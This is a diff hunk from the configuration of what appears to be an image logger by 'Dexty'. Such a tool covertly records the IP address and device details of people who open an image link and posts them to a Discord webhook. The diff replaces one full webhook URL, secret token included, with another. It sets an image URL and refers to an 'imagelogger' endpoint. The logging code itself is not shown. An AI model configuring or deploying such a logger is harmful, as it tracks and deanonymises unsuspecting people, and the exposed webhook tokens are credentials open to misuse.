@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1410583351525376091/JcE2praGVJYG8Hj77ilDHYIlClfzQDgMx-jxFeBxGjf2KLmf_Nf8W8O7Lh8_rrZ-VsBn",
+    "webhook": "https://discord.com/api/webhooks/1425827569193717800/FscZf1kKJRQr8YMwCqg8pOec1H6mMckUZ0Pw9Au7Dox0b-kbLtqr09kn9Kfgo99wWiZT",
     "image": "https://raw.githubusercontent.com/SDF8/nothing/refs/heads/main/test.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
